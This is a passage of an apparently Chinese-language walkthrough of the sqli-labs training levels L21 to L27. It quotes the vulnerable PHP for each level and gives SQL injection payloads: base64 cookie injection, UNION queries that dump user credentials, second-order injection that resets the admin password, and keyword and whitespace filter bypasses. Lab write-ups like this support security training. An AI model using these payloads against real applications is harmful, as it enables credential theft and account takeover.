</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"x') OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #"</span>
payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-21"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L22</h3><p class="x-p">闭合方式为双引号。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$cookee</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$cookee1</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">'x" OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #'</span>
payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
resp <span class="token operator">=</span> query_post<span class="token punctuation">(</span><span class="token string">"Less-22"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"uname"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 class="x-h1">过滤与绕过：L23-28</h2><h3 class="x-h2">L23</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span>
<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span>
<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">注释符被过滤了，那就手动构造一个拼接后语法合法的SQL语句：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1"</span></code></pre></div><img alt="img" loading="lazy" width="1743" height="372" decoding="async" data-nimg="1" class="x-image" style="color:transparent;width:100%;height:auto" src="/_next/static/media/L23.3b3a3a48.jpg"/><h3 class="x-h2">L24：二次注入</h3><p class="x-p">L24中所有直接注入点的输入都经过<code class="x-inline-highlight">mysql_escape_string</code>或<code class="x-inline-highlight">mysql_real_escape_string</code>的过滤。</p><p class="x-p">注意注册新用户的逻辑：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO users (username, password) VALUES (\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">如果注册用户的用户名为<code class="x-inline-highlight">admin' #</code>（密码为<code class="x-inline-highlight">123</code>），在经过<code class="x-inline-highlight">mysql_escape_string</code>转义后变成<code class="x-inline-highlight">admin&#92;' #</code>，拼接到<code class="x-inline-highlight">$sql</code>中变成：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">"admin\' #"</span><span class="token punctuation">,</span> <span class="token string">"123"</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p">而这条语句执行后，插入到数据库的用户名中，对单引号的转义被还原：</p><img alt="img" loading="lazy" width="705" height="134" decoding="async" data-nimg="1" class="x-image" style="color:transparent;height:auto" src="/_next/static/media/L24-1.d0663298.jpg"/><p class="x-p">在登录后，服务端设置<code class="x-inline-highlight">$_SESSION["username"]</code>为用户名，二次注入的注入点发生在修改密码功能：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 144px, var(--bg-transparent-golden) 144px 168px, transparent 168px)"><code><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$curr_pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$re_pass</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET password='<span class="token interpolation"><span class="token variable">$pass</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' AND password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>'"</span><span class="token punctuation">;</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">当用以下表单参数修改密码时：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>current_password    xxx
password            123
re_password         123
</code></pre></div><p class="x-p">服务端实际执行的SQL语句为：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">SQL</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> password<span class="token operator">=</span><span class="token string">'123'</span> <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token comment">#' AND password='xxx'</span></code></pre></div><p class="x-p">此时成功在不知道<code class="x-inline-highlight">admin</code>用户原密码的情况下，将其密码修改为<code class="x-inline-highlight">123</code>。</p><img alt="img" loading="lazy" width="705" height="160" decoding="async" data-nimg="1" class="x-image" style="color:transparent;height:auto" src="/_next/static/media/L24-2.47502d97.jpg"/><h3 class="x-h2">L25</h3><p class="x-p">过滤<code class="x-inline-highlight">or</code>和<code class="x-inline-highlight">and</code>，可以用<code class="x-inline-highlight">||</code>和<code class="x-inline-highlight">&&</code>绕过。注意我们想查询的列<code class="x-inline-highlight">password</code>恰好也包含了<code class="x-inline-highlight">or</code>，可以双写为<code class="x-inline-highlight">passwoorrd</code>绕过。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- "</span></code></pre></div><h3 class="x-h2">L25a</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=99 UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- "</span></code></pre></div><h3 class="x-h2">L26</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// strip out OR (non case sensitive)</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out AND (non case sensitive)</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out --</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// Strip out #</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out spaces</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out slashes</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">绕过<code class="x-inline-highlight">or</code>和注释的思路和之前一样；关于空白符过滤，这里测试下来发现PHP 5.3.29（环境为Windows）中<code class="x-inline-highlight">preg_match</code>的<code class="x-inline-highlight">\s</code>不会匹配字符<code class="x-inline-highlight">\x0B (Vertical Tab)</code>。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE '1'='1"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L26a</h3><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>payload <span class="token operator">=</span> <span class="token string">"?id=x') UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE ('1'='1"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"%0b"</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">L27</h3><p class="x-p">大小写敏感的关键字过滤，用任意一种大小写变形绕过即可。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out /*</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Strip out --.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Strip out #.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[ +]/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// Strip out spaces.</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/union/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out union</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out select</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/UNION/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out UNION</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/SELECT/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Strip out SELECT</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/Union/s'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Strip out Union</span>
